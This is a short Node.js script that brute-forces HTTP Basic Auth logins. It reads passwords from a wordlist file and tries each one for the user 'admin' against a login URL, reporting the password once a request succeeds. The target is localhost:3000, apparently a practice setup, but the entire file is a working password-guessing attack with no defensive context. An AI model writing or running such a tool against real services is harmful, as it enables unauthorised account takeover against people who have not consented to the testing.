const axios = require("axios");
const fs = require("fs");
const path = require("path");

async function force(url, username) {
  const words = fs.readFileSync("words.txt", "utf-8").split("\n");

  for (let i = 0; i < words.length; i++) {
    const password = words[i];
    console.log("Trying password:", password);
    try {
      const response = await axios.get(url, {
        auth: {
          username: username,
          password: password.trim(),
        },
      });

      if (response.status === 200) {
        console.log("Password found:", password);
        return;
      }
    } catch (error) {}
  }
}

force("http://localhost:3000/login", "admin");
